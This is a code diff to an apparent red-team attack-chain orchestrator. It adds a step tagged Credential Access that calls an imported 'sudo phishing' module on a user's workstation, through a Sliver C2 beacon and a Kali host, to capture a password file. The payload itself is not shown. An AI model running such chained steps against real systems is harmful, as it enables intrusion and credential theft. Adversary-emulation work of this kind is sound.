@@ -125,9 +125,12 @@ STEP_META_ADVANCED: dict[str, dict] = {
         "techniques": ["T1021.004", "T1556.003", "T1499.004"],
         "color": "magenta",
     },
+    "vinzenzws_privesc": {
+        "tactic": "TA0006 · Credential Access",
+        "techniques": ["T1556.003", "T1078"],
+        "color": "red",
+    },
 }
-
-
 def _step_meta(name: str, mode: str = "basic") -> dict:
     """Return the TTP-metadata dict for ``name`` under the requested ``mode``.
 
@@ -340,9 +343,12 @@ def _step_advanced_lateral_movement(ctx: Context) -> dict[str, Any]:
         root_sliver_session=ctx.state["root_sliver_session"],
         kali_host=ctx.kali_host,
     )
-    if not result.get("vinzenz_shell_sock"):
+    if not result.get("vinzenz_shell"):
         raise RuntimeError("advanced lateral movement returned no shell for vinzenz")
-    return {"vinzenz_shell_sock": result["vinzenz_shell_sock"]}
+    return {
+        "vinzenz_shell": result["vinzenz_shell"],
+        "vinzenz_beacon": result.get("vinzenz_beacon"),
+    }
 
 
 def _step_exploit(ctx: Context) -> dict[str, Any]:
@@ -457,6 +463,20 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
     return _close
 
 
+def _step_advanced_vinzenzws_privesc(ctx: Context) -> dict[str, Any]:
+    from vinzenzws_privesc import run as privesc_run
+
+    result = privesc_run(
+        vinzenz_shell=ctx.state.get("vinzenz_beacon"),
+        kali_host=ctx.kali_host,
+    )
+    if not result.get("vinzenz_password_file"):
+        raise RuntimeError("sudo phishing on vinzenz's workstation failed to drop password file")
+    return {
+        "vinzenz_password_file": result["vinzenz_password_file"],
+    }
+
+
 # ---------------------------------------------------------------------------
 # Chain definition
 # ---------------------------------------------------------------------------
@@ -534,7 +554,11 @@ CHAIN_ADVANCED: list[Step] = [
         "advanced_lateral_movement",
         _step_advanced_lateral_movement,
         requires=("root_sliver_session",),
-        teardown=_teardown_close_socket("vinzenz_shell_sock"),
+    ),
+    Step(
+        "vinzenzws_privesc",
+        _step_advanced_vinzenzws_privesc,
+        requires=("vinzenz_beacon",),
     ),
 ]
 
